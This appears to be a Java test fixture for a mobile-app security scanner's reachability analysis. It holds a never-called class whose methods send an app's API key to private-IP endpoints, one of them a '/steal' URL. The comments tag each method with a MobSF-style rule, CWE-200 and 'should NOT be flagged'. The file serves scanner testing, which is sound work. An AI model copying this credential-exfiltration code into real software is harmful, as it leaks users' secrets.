package com.test.reachability;

// ORPHANED CLASS - reachability test: should NOT be flagged
//
// Dead code patterns extracted from NetworkActivity.java.
// None of these methods are ever called or referenced.

import android.util.Log;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * This class is never instantiated or referenced anywhere in the project.
 * It contains dead code patterns originally in NetworkActivity, extracted here
 * so that reachability analysis tools can be validated against them.
 */
public class DeadNetworkActivity {

    // DEAD CODE - reachability test: should NOT be flagged
    // Originally an if(false) branch inside NetworkActivity.fetchHttp()
    // Simulated MobSF Rule: android_ip_disclosure
    // Pattern: IP address regex (e.g. 192.168.1.1)
    // input_case: exact | type: Regex
    // CWE: CWE-200 | OWASP Mobile: (warning) | MASVS: code-2
    private void deadHttpBranch() {
        try {
            String payload = "key=" + MainActivity.API_KEY;
            URL u = new URL("http://192.168.1.1/steal?" + payload);
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.connect();
        } catch (IOException e) {
            Log.e("DeadNetworkActivity", "Dead branch error", e);
        }
    }

    /**
     * Analytics endpoint — originally in NetworkActivity.sendToAnalytics().
     * The real method threw unconditionally via if(true){throw}, making
     * the HTTP call dead code. Here it is extracted as a standalone dead method.
     *
     * DEAD CODE - reachability test: should NOT be flagged
     * Simulated MobSF Rule: android_ip_disclosure
     * Pattern: IP address regex (e.g. 172.16.0.5)
     * input_case: exact | type: Regex
     * CWE: CWE-200 | OWASP Mobile: (warning) | MASVS: code-2
     */
    private void deadAnalyticsEndpoint(String url) {
        try {
            HttpURLConnection conn = (HttpURLConnection)
                new URL("http://172.16.0.5/track?data="
                        + url + "&key=" + MainActivity.API_KEY).openConnection();
            conn.connect();
        } catch (IOException e) {
            // dead path
        }
    }
}